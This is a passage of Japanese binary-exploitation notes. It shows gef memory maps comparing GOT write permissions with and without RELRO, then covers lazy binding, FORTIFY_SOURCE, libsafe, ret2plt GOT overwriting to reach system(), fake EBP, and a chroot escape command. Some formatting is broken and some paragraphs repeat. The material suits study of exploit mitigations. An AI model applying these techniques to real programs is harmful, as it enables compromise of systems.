0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
```
relroなし:
```
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
```markdown
**relroが無効なバイナリ**については、`fgets`の`got`エントリアドレスが`0x404018`であることがわかります。メモリマッピングを見ると、`0x404000`と`0x405000`の間に位置しており、**パーミッションが`rw`**であるため、読み書きが可能です。**relroが有効なバイナリ**では、バイナリの実行時の`got`テーブルアドレス（pieが有効なのでこのアドレスは変更されます）が`0x555555557fd0`であることがわかります。そのバイナリのメモリマッピングでは、`0x0000555555557000`と`0x0000555555558000`の間に位置しており、メモリ**パーミッションが`r`**であるため、読み取りのみ可能です。

では、**バイパス**は何でしょうか？私がよく使う典型的なバイパスは、relroによって読み取り専用になったメモリ領域に書き込まないこと、そして**コード実行を得るための別の方法を見つける**ことです。

このためには、バイナリが実行前に関数のアドレスを知っている必要があります：

* 遅延バインディング：関数のアドレスは、その関数が初めて呼び出されたときに検索されます。したがって、実行中にGOTが書き込み可能である必要があります。
* 今すぐバインド：関数のアドレスは実行の始めに解決され、その後、.got、.dtors、.ctors、.dynamic、.jcrなどのセンシティブなセクションに読み取り専用のパーミッションが与えられます。`` `**``-z relro`**`と`**`-z now\`\*\*

プログラムが今すぐバインドを使用しているかどうかを確認するには：
```
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
```markdown
バイナリがメモリにロードされ、関数が初めて呼び出されると、PLT（Procedure Linkage Table）にジャンプします。ここからGOT（Global Offset Table）にジャンプし、そのエントリが解決されていないこと（PLTの次のアドレスを含んでいる）を発見します。そのため、ランタイムリンカーまたはrtfdが呼び出され、アドレスを解決してGOTに保存します。

関数が呼び出されるとPLTが呼び出されます。PLTには関数のアドレスがGOTに保存されているため、そこにフローがリダイレクトされ、関数が呼び出されます。しかし、関数が初めて呼び出される場合、GOTにあるのはPLTの次の命令です。したがって、フローはPLTのコード（rtfd）に従い、関数のアドレスを見つけてGOTに保存し、関数を呼び出します。

バイナリをメモリにロードすると、コンパイラはプログラム実行時にロードする必要があるデータをどのオフセットに配置するかを指示します。

Lazy binding —> 関数のアドレスは、その関数が初めて呼び出されたときに検索されます。そのため、GOTは書き込み可能な権限を持っており、検索時にそこに保存され、再検索の必要がありません。

Bind now —> 関数のアドレスはプログラムのロード時に検索され、.got、.dtors、.ctors、.dynamic、.jcrのセクションの権限が読み取り専用に変更されます。**-z relro** と **-z now**

それでも、一般的にプログラムはこれらのオプションでコンパイルされていないため、これらの攻撃はまだ可能です。

**readelf -l /proc/ID_PROC/exe | grep BIND_NOW** —> BIND NOWが使用されているかを確認する

**Fortify Source -D_FORTIFY_SOURCE=1 または =2**

不安全な方法である場所から別の場所へのコピーを行う関数を特定し、安全な関数に変更することを試みます。

例えば:\
char buf[16];\
strcpy(but, source);

この関数を不安全として特定し、strcpy()をバッファサイズを最大コピーサイズとして使用する__strcpy_chk()に変更します。

**=1** と **=2** の違いは以下の通りです:

後者は、書き込み権限のあるセクションから **%n** が来ることを許可しません。さらに、直接引数アクセスのパラメータは、前述のものを使用している場合にのみ使用できます。つまり、**%3$d** を使用するには、先に **%2$d** と **%1$d** を使用している必要があります。

エラーメッセージを表示するには argv[0] を使用するため、そこに別のアドレス（グローバル変数など）を設定すると、エラーメッセージにその変数の内容が表示されます。ページ 191

**Libsafeの置き換え**

以下のようにアクティブになります: LD_PRELOAD=/lib/libsafe.so.2\
または\
"/lib/libsave.so.2" > /etc/ld.so.preload

不安全な関数の呼び出しを安全なものに置き換えます。標準化されていません。（x86専用、-fomit-frame-pointerでのコンパイルには対応していません、静的コンパイルには対応していません、すべての脆弱な関数が安全になるわけではありません、LD_PRELOADはsuid付きバイナリでは機能しません）。

**ASCII Armored Address Space**

共有ライブラリを0x00000000から0x00ffffffの範囲にロードし、常に0x00のバイトが存在するようにします。しかし、これは実際にはほとんどの攻撃を止めることはできず、特にリトルエンディアンでは効果がありません。

**ret2plt**

PLTのstrcpy@plt関数を呼び出し、GOTのエントリを指し、呼び出したい関数（system()）の最初のバイトをコピーするROPを実行します。次に、GOT+1を指してsystem()の2番目のバイトをコピーします... 最終的にGOTに保存されたアドレスがsystem()になります。

**偽のEBP**

EBPレジスタを使用して引数を指す関数に対して、EIPをsystem()に変更すると、EBPも変更され、メモリの任意の2バイトの後に&"/bin/sh"のアドレスを指すようになります。

**chroot()を使用したジェイル**

debootstrap -arch=i386 hardy /home/user —> 特定のサブディレクトリに基本システムをインストールします

管理者は以下のようにしてジェイルから脱出できます: mkdir foo; chroot foo; cd ..

**コードのインストルメンテーション**

Valgrind —> エラーを検索\
Memcheck\
RAD (Return Address Defender)\
Insure++
```
